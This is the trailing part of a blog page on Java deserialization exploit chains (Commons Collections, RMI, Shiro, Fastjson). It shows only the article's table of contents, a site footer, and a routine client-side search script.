href="#HashMap-putForCreate-amp-HashMap-readObject"><span class="toc-text">HashMap.putForCreate() &amp; HashMap.readObject()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HashMap-put-%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">HashMap.put()的问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0"><span class="toc-text">POC构造</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8hash-%E5%A4%84%E4%BA%8C%EF%BC%88%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">调用hash()处二（方法二）：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HashSet"><span class="toc-text">HashSet</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HashSet-readObject"><span class="toc-text">HashSet.readObject()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HashSet-add"><span class="toc-text">HashSet.add()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0-1"><span class="toc-text">POC构造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-4"><span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-7"><span class="toc-text">Commons Collections 7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-6"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-3"><span class="toc-text">利用链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-2"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AbstractMap-equals"><span class="toc-text">AbstractMap.equals()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hashtable-reconstitutionPut"><span class="toc-text">Hashtable.reconstitutionPut()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hashtable-readObject"><span class="toc-text">Hashtable.readObject()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AALazyMap"><span class="toc-text">两个LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E6%A0%B7%E7%9A%84hash"><span class="toc-text">一样的hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fake-Transformer"><span class="toc-text">Fake Transformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FakeTransformer%E5%BC%95%E5%8F%91%E7%9A%84LazyMap%E9%97%AE%E9%A2%98"><span class="toc-text">FakeTransformer引发的LazyMap问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0-2"><span class="toc-text">POC构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-5"><span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-11"><span class="toc-text">Commons Collections 11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-3"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-7"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%B6%E6%84%8Fclass%E5%AD%97%E8%8A%82%E7%A0%81%E7%BC%96%E5%86%99"><span class="toc-text">恶意class字节码编写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8Fclass"><span class="toc-text">TemplatesImpl加载恶意class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#InvokerTransformer-1"><span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap-2"><span class="toc-text">LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry"><span class="toc-text">TiedMapEntry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HashMap"><span class="toc-text">HashMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B9%E5%86%99InvokerTransformer"><span class="toc-text">改写InvokerTransformer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0-3"><span class="toc-text">POC构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">RMI反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">RMI前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Codebase%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">Codebase远程命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-4"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E6%94%BB%E5%87%BB%E6%96%B9"><span class="toc-text">被攻击方</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9"><span class="toc-text">攻击方</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Policy%E9%85%8D%E7%BD%AE"><span class="toc-text">Policy配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F"><span class="toc-text">环境模拟</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-6"><span class="toc-text">Reference</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97"><span class="toc-text">Shiro反序列化漏洞系列</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">Shiro550反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-8"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-text">反序列化触发流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A5%E6%89%8B%E7%82%B9"><span class="toc-text">入手点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RememberMe%E7%94%9F%E6%88%90"><span class="toc-text">RememberMe生成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RememberMe%E8%A7%A3%E5%AF%86"><span class="toc-text">RememberMe解密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8APOC"><span class="toc-text">漏洞利用及POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-7"><span class="toc-text">Reference</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97"><span class="toc-text">FastJson反序列化漏洞系列</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-5"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-text">Fastjson的基础使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF"><span class="toc-text">场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-9"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E5%AF%B9%E8%B1%A1%E8%BD%AC%E5%8C%96%E4%B8%BAjson%E6%A0%BC%E5%BC%8F"><span class="toc-text">将对象转化为json格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86json%E6%A0%BC%E5%BC%8F%E8%BD%AC%E5%8C%96%E4%B8%BA%E5%AF%B9%E8%B1%A1"><span class="toc-text">将json格式转化为对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Setter%E5%92%8CGetter%E8%B0%83%E7%94%A8%E7%9A%84%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%A9%B6"><span class="toc-text">Setter和Getter调用的深入探究</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaBeanInfo-build"><span class="toc-text">JavaBeanInfo#build</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Setter"><span class="toc-text">Setter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getter"><span class="toc-text">Getter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-text">Fastjson的反序列化流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">JdbcRowSetImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0-4"><span class="toc-text">POC构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">TemplatesImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-1"><span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="toc-text">POC构造与分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%A4%E6%9D%A1%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">总结两条利用链的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-text">Fastjson各个版本分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96"><span class="toc-text">1.2.25版本变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25-1-2-41%E7%BB%95%E8%BF%87"><span class="toc-text">1.2.25-1.2.41绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BB%A5-%E5%BC%80%E5%A4%B4"><span class="toc-text">方法一：以[开头</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E4%BB%A5L%E5%BC%80%E5%A4%B4-%E7%BB%93%E5%B0%BE"><span class="toc-text">方法二：以L开头;结尾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96"><span class="toc-text">1.2.42版本变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42%E7%BB%95%E8%BF%87"><span class="toc-text">1.2.42绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BB%A5-%E5%BC%80%E5%A4%B4-1"><span class="toc-text">方法一：以[开头</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E4%BB%A5LL%E5%BC%80%E5%A4%B4-%E7%BB%93%E5%B0%BE"><span class="toc-text">方法二：以LL开头;;结尾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-43%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="toc-text">1.2.43版本变化及绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-44%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96"><span class="toc-text">1.2.44版本变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25-1-2-47%E9%80%9A%E6%9D%80"><span class="toc-text">1.2.25 - 1.2.47通杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-48%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96"><span class="toc-text">1.2.48版本变化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-text">Fastjson不出网利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-8"><span class="toc-text">Reference</span></a></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/leihehehe">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:hslscarlett@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/leihehehe">Copyright © 2023 Shulei He</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88(4) + '&url=' + https%3A%2F%2Fleihehe.top%2F2021%2F07%2F31%2FJava%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%25BC%258F%25E6%25B4%259E%25E4%25B9%258B%25E5%2588%25A9%25E7%2594%25A8%25E9%2593%25BE%25E5%2588%2586%25E6%259E%2590%25E9%259B%2586%25E5%2590%2588-4%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://leihehe.top/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
